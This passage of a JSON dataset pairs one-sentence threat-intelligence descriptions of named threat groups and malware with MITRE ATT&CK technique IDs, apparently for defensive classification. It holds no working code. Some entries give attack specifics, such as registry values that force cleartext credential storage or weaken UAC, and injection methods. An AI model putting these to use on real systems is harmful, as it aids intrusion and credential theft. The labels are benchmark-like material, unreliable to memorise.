      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "GALLIUM used WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "IndigoZebra has downloaded additional files and tools from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has monitored files' modified time.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has used a delivered trojan to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has used multiple Windows APIs including HttpInitialize, HttpCreateHttpHandle, and HttpAddUrl.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper is capable of enumerating the running processes on the system using pslist.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has injected a DLL backdoor into dllhost.exe and svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has detected a target system’s OS version and system volume information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has used scripts to collect the host's network topology.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has used known administrator account credentials to execute the backdoor directly.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Leafminer has used Process Doppelgänging to evade security software while deploying tools on compromised systems.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Inception used a file hunting plugin to collect .txt, .pdf, .xls or .doc files from the infected host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Inception used a file listing plugin to collect information about file and directories both on local and remote drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Inception has used a reconnaissance module to identify active processes and other associated loaded modules.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Sharpshooter downloaded additional payloads after a target was infected with a first-stage downloader.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sharpshooter's first-stage downloader resolved various Windows libraries and APIs, including LoadLibraryA(), GetProcAddress(), and CreateProcessA().",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Sharpshooter has leveraged embedded shellcode to inject a downloader into the memory of Word.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT19 used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee's service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee uses a batch file that modifies Registry keys to launch a DLL into the svchost.exe process.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Honeybee uses a batch file to load a DLL into the svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "APT41 has uploaded files and data from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT41 has executed file /bin/pwd on exploited victims, perhaps to return architecture related information.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT41 used certutil to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT41 malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group has collected data and files from compromised networks.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group has conducted word searches on compromised machines to identify specific documents of interest. Lazarus Group malware can use a common function to identify target files by their extension, and some also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group has downloaded files, malware, and tools from its C2 onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group has used the Windows API ObtainUserAgentString to obtain the User-Agent from a compromised host to connect to a C2 server.[18] Lazarus Group has also used various, often lesser known, functions to perform various types of Discovery and Process Injection.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group malware families gather a list of running processes on a victim system and send it to their C2 server. A Destover-like variant used by Lazarus Group also gathers process times.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information. A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware IndiaIndia obtains and sends to its C2 server information about the first network interface card’s configuration, including IP address, gateways, subnet mask, DHCP information, and whether WINS is available.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group has used administrator credentials to gain access to restricted network segments.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group has used WMIC for discovery as well as to execute payloads for persistence and lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team has enumerated files on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team used a backdoor to enumerate information about the infected system's operating system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team checks for connectivity to other resources in the network.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team has collected the username from a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team have used previously acquired legitimate credentials prior to attacks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team has used stolen credentials to access administrative accounts within the domain.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Sandworm Team has used VBScript to run WMI queries.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "TA505 has been seen injecting a DLL into winword.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TA505 has used stolen domain admin accounts to compromise additional hosts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Volatile Cedar can deploy additional tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Blue Mockingbird has used wmic.exe to set environment variables.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Confucius has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Confucius has downloaded additional files and payloads onto a compromised host following initial access.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Confucius has used a file stealer that can examine system drives, including those other than the C drive.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT18 can upload a file to the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT18 can collect system information from the victim’s machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware gathers the Address Resolution Protocol (ARP) table from the victim.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware gathers system information via Windows Management Instrumentation (WMI).",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Leviathan has utilized techniques like reflective DLL loading to write a DLL into memory and load a shell that provides backdoor access to the victim.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Leviathan has obtained valid accounts to gain initial access.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has extracted files from compromised networks.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "APT29 obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has downloaded additional tools, such as TEARDROP malware and Cobalt Strike, to a compromised host following initial access.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has used multiple command-line utilities to enumerate running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "APT29 used fsutil to check available free space before executing actions that might create large files on disk.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT29 used different compromised credentials for remote access and to move laterally.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has used valid accounts, including administrator accounts, to help facilitate lateral movement on compromised networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has used compromised local accounts to access victims' networks.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT29 has used a compromised O365 administrator account to create a new Service Principal.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "APT29 used WMI to steal credentials and execute backdoors at a future time.[24] They have also used WMI for the remote execution of files for lateral movement.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Rocke used malware to download additional malicious files to the target system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Rocke can detect a running process's PID on the infected machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Rocke's miner, \"TermsHost.exe\", evaded defenses by injecting itself into Windows processes, including Notepad.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Rocke has used uname -m to collect the name and information about the infected system's kernel.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Indrik Spider has collected credentials from infected systems, including domain accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Indrik Spider has used WMIC to execute commands on remote computers.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Windigo has used a script to check for the presence of files created by OpenSSH backdoors.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Windigo has used a script to detect which Linux distribution and version is currently installed on the system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "PLATINUM has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT32 malware has injected a Cobalt Strike beacon into Rundll32.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. APT32 executed shellcode to identify the name of the infected host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "APT32 used the ipconfig /all command to gather the IP address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "APT32 collected the victim's username and executed the whoami command on the victim's machine. APT32 executed shellcode to collect the username on the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "FIN10 has moved laterally using the Local Administrator account.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has modified the Registry key HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has injected malicious DLLs into memory with read, write, and execute permissions.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has used \"systeminfo\" and similar commands to acquire detailed configuration information of a victim machine.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has used \"ipconfig\" to identify the network configuration of a victim machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has used \"whoami\" to identify the local user and their privileges.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Wizard Spider has used WMI and LDAP queries for network discovery and to move laterally.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "LazyScripter had downloaded additional tools to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has searched the entire target system for DOC, DOCX, PPT, PPTX, XLS, XLSX, and PDF files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has downloaded additional executables following the initial infection stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has used tasklist /v to determine active process information.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has gathered system information using systeminfo.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has used ipconfig and arp to determine network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Mustang Panda has executed PowerShell scripts via WMI.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Windshift has used tools to deploy additional payloads to compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Windshift has used malware to enumerate active processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Windshift has used malware to identify the computer name of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Windshift has used malware to identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Windshift has used WMI to collect information about target machines.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Aquatic Panda has downloaded additional malware onto compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Aquatic Panda has used native OS commands to understand privilege levels and system details.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has executed the reg query command for HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has executed the ipconfig /all command.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Epic recursively searches for all .doc files on the system and collects a directory listing of the Desktop, %TEMP%, and %WINDOWS%\\Temp directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Epic uses the tasklist /v command to obtain a list of processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Epic has overwritten the function pointer in the extra window memory of Explorer's Shell_TrayWnd in order to execute malicious code in the context of the explorer.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Epic uses the nbtstat -n and nbtstat -s commands on the victim’s machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Epic collects the user name from the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Hikit can upload files from compromised machines.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Hikit has the ability to download files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LoJax has modified the Registry key ‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’ from ‘autocheck autochk ’ to ‘autocheck autoche ’.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Power Loader overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "SoreFang has the ability to list directories.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "SoreFang can download additional payloads from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "SoreFang can enumerate processes on a victim machine through use of Tasklist.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "SoreFang can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing Systeminfo.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "SoreFang can collect the TCP/IP, DNS, DHCP, and network adapter configuration on a compromised host via ipconfig.exe /all.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "WellMail can exfiltrate files from the victim machine.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "WellMail can receive data and executable scripts from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "WellMail can identify the IP address of the victim system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "WellMail can identify the current username on the victim system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "BitPaymer can set values in the Registry to help in execution.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "BitPaymer has used dynamic API resolution to avoid identifiable strings within the binary, including RegEnumKeyW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "BitPaymer can use the RegEnumKeyW to iterate through Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "PolyglotDuke can retrieve payloads from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PolyglotDuke can write encrypted JSON configuration files to the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "PolyglotDuke can use LoadLibraryW and CreateProcess to load and execute code.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "QuietSieve can collect files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "QuietSieve can search files on the target host by extension, including doc, docx, xls, rtf, odt, txt, jpg, pdf, rar, zip, and 7z.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "QuietSieve can download and execute payloads on a target host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "QuietSieve can check C2 connectivity with a ping to 8.8.8.8 (Google public DNS).",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Mivast has the capability to download and execute .exe files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CostaBricks has been used to load SombRAT onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "EVILNUM can download and upload files to the victim's computer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "EVILNUM can make modifications to the Regsitry for persistence.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "EVILNUM can obtain the computer name from the victim's system.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "EVILNUM can obtain the username from the victim's machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "EVILNUM has used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Lizar can download additional plugins, files, and tools.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Lizar has used various Windows API functions on a victim's machine.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Lizar has a plugin designed to obtain a list of processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "Lizar can migrate the loader into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lizar has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lizar can execute PE files in the address space of the specified process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Lizar can collect the computer name from the machine,.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Lizar can retrieve network information from a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Lizar can collect the username from the system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "RGDoor uploads and downloads files to and from the victim’s machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RGDoor executes the whoami on the victim’s machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Chrommme can collect data from a local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "Chrommme can download its code from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Chrommme can use Windows API including WinExec for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Chrommme has the ability to list drives and obtain the computer name of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Chrommme can enumerate the IP address of a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Chrommme can retrieve the username from a targeted system.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "AdFind can extract subnet information from Active Directory.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "TinyTurla can upload files from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "TinyTurla has the ability to act as a second-stage dropper used to infect the system with additional malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "TinyTurla can set its configuration parameters in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "TinyTurla has used WinHTTP, CreateProcess, and other APIs for C2 communications and other functions.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "TinyTurla can query the Registry for its configuration information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "FYAnti can search the C:\\Windows\\Microsoft.NET\\ directory for files of a specified size.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "FYAnti can download additional payloads to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sliver can enumerate files on a target system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Sliver can upload files from the C2 server to the victim machine using the upload command.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Sliver can inject code into local and remote processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sliver has the ability to gather network configuration information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "USBStealer searches victim drives for files matching certain extensions (\".skr\",\".pkr\" or \".key\") or names.",
